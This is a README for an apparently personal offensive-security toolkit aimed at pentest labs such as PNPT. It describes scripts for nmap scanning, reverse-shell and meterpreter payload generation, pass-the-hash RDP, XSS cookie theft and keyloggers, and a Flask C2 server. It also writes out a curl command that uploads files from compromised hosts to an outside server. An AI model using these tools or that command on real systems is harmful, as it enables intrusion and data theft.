# Incompetent Bastard

*Not so fine (you'll find out) bash and python scripts for incompetent bastards, like myself.*



command `screen -list` will show you the availabe screens.

An here are some basics.....

Press "Ctrl-A" on the keyboard and press "D" to detach from a screen

Press "Ctrl-A" on the keyboard and press "Esc."
Press the "Up" and "Down" arrow keys or the "PgUp" and "PgDn" keys to scroll through previous output.
Press "Esc" to exit scrollback mode.








## Bash scripts currently on board


### ./init.sh (always use this function first)

This script will setup the basisc things. Safe your OpenVPN file in the meuk directory as client.ovpn. If this file is there, `init.sh` will start it in a detachted screen. 

If everything is well, you'll see the following results

```
# screen -list                                                                                                                    
There are screens on:
	1708.metasploit	(07/22/2022 10:02:47 AM)	(Detached)
	1704.http	(07/22/2022 10:02:47 AM)	(Detached)
	1701.smb	(07/22/2022 10:02:47 AM)	(Detached)
	1699.vpn	(07/22/2022 10:02:47 AM)	(Detached)
4 Sockets in /run/screen/S-root.
```

And off you go.




### ./scan.sh (always use this function second)

This wil take a basic nmap scan of the network. For example mylocalnetwork

```./scan.sh eth0 mylocalnetwork 12.3.4/24```

Scan output will be prefixed with `mylocalnetwork`


### ./search.sh

Completed the scan with `scan.sh`? `search.sh` greps the output

Find all host's Up:
```./search.sh mylocalnetwork up```

Find all MS SMB shares:
```./search.sh mylocalnetwork microsoft-ds```

Find all Samba shares
```./search.sh mylocalnetwork Samba```

Etc. Use your imagination. 

### ./revershells.sh

This file is called by `scan.sh`

Generates some reverse shells and a txt file for some good ol' copy & paste.
Currently default's to port 443 you. Change this by giving the port als a second option.
You'll find the generated shells and the textfile shell_443.txt in the directory http/payloads.

Usage (with port set to default port):
```./reverseshell.sh eth0```
Or to change the port to 4444:
```./reverseshell.sh eth0 4444```

The reverse shells are taken from 

### ./shell.sh

Connect to a screen

### ./sshuttle.sh

Obvious

### ./commands.sh

inject a file from http/commands in to a screen session

```./commands.sh screenname filename```

### ./kerberos.sh
Get info from domain controlers

Usage:
```./kerberos.sh mylocalnetwork```

### ./ftp_anon.sh
Enumerates all open ftp shares with nmap.

Usage:
```./ftp_anon.sh mylocalnetwork```

### ./ftp_asp.sh

todo

### ./rfi_input.sh

This one utilizes `php://input%00`


### ./gen_passwords.sh

Just run `./gen_passwords.sh`

Generates a password list of basic passwords with common variations. You might want to change the values in commonpasswords and take a close look to your cewl output.

When you are stuck on PNPT this might give you a clue.... Thank me later ;)


### ./vpn.sh

A simple wrapper for xfreerdp

With default creds: `./vpn.sh 127.0.0.1`
With other creds: `./vpn.sh 127.0.0.1 Administrator P@ssw0rd!`
With Pash the Hash `./vpn.sh 127.0.0.1 Administrator x NTLMHASH`


### ./gui.sh

Yes, it comes with a GUI, well sort off....

## Python scripts onboard

### app.py

This script is called by `init.sh` make sure you ran `scan.sh` before visiting `app.py` on localhost.

Elevating humanity with a new twisted variant of `python3 -m http.server 80` in Flask. A C2 for poor people...

`flask run --port 80` 

It currently supports:
- serving payloads
- basic reporting (owasp top 10 and CWE top 25) and note keeping
- xss payloads, extracting cookies, keylogger etc.
- Quick overview of generated payloads by `reverseshell.sh`
- Some bookmarks... yolo.
- Pesky SSRF 307 redirects
- Second Order SQLi
- XXE
- Upload directory. Easily extract files from hosts with with `curl -F file=@FILENAME https://incompetentbastard.com/upload`
- Sync findings to DefectDojo
- Domain fronting & C2 functionality
- An overview (and interacting) of current attached screens and MSF sessions
- Random quotes!


A manual will be available in the not-too-distant future..

### methaspx.py

Builds an custom aspx shell and some malicious VB and HTA files

### invoke-shellcode.py

Adjusted from: 
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1

Invokes a reverse 32x or 64x reverse TCP shell instead of calc.

### meterpreter.py

Builds a custom exe with payload

### powershell.py

Generate some custom powershell scripts and writes it to the file generated by `reverseshells.sh`. 
It also create some download links (lolbas/powershell) for the files at the `http/tools/` directory.

### payloads.py

[Todo] Generates some extra custom payloads.



# dependancies

For MacOS, this might help...


- ip `brew install iproute2mac`
- mono/ xbuild `brew install mono`
- ` pip3 install dnsrecon asciinema nmaptocsv`



